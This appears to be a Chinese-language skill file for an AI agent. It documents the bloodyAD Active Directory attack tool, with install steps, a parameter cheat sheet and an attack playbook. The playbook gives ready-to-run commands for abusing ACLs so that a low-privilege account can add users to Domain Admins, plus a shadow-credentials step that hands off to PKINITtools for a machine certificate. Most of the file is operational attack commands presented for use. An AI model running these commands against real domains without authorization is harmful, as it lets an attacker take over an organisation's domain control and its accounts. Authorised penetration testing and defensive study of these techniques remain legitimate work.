---
name: bloodyad-ad-privesc
description: 渗透工具 skill:bloodyAD 的安装、参数速查与攻击场景 playbook。当任务涉及 AD域渗透与域控攻击 需要调用 bloodyAD 时使用。
---

# bloodyAD

- 攻击大类:C30 AD域渗透与域控攻击
- 上游仓库:https://github.com/CravateRouge/bloodyAD
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install bloodyAD
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `-d corp.local -u user -p pass --host dc01 get object 'DC=corp,DC=local' --attr nTSecurityDescriptor` | 读 ACL |
| `add dacl ...` | 加委派/写权限 |
| `set object user accountenabled true` | 启用账号 |
| `get child --type User` | 列子对象 |
| `-k` | Kerberos 票据 |
| `--dc-ip 10.0.0.5` | 指定 DC |

## 攻击场景 Playbook

### ACL 滥用提权链

```bash
bloodyAD -d corp.local -u lowuser -p pass --host dc01 add dacl "OU=IT,DC=corp,DC=local" lowuser WriteMembers
bloodyAD -d corp.local -u lowuser -p pass --host dc01 add groupMember "CN=Domain Admins,CN=Users,DC=corp,DC=local" victim  # 写入组即提权
```

### GenericWrite→影子凭证

```bash
bloodyAD -d corp.local -u user -p pass --host dc01 set object target servicePrincipalName
# 再跑 PKINITtools 拿机器账户证书
```

## 注意事项

直接 LDAP 操作 DACL/属性和证书;AD 权限提升瑞士刀,语法比原生 PowerView 干净。
